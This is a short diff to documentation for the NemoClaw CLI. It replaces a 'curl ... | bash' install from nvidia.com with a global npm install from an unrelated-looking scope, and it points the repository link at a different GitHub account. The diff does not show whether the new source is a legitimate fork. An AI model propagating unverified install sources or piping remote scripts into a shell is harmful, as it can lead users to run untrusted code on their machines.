@@ -77,13 +77,13 @@ Install the CLI and launch a sandboxed OpenClaw instance in a few commands.
     <span class="nc-term-dot nc-term-dot-g"></span>
   </div>
   <div class="nc-term-body">
-    <div><span class="nc-ps">$ </span>curl -fsSL https://nvidia.com/nemoclaw.sh | bash</div>
+    <div><span class="nc-ps">$ </span>npm install -g @mawdbotsonsolana/nemoclaw</div>
   </div>
 </div>
 ```
 
-Run `nemoclaw --help` in your terminal to view the full CLI reference.
-You can also clone the [NemoClaw repository](https://github.com/NVIDIA/NemoClaw) to explore the plugin source and blueprint.
+Run `nemoclaw doctor` to validate your machine, or `nemoclaw --help` to view the full CLI reference.
+You can also clone the [NemoClaw repository](https://github.com/x402agent/NemoClaw) to explore the plugin source and blueprint.
 
 Proceed to the [Quickstart](get-started/quickstart.md) for step-by-step instructions.
 
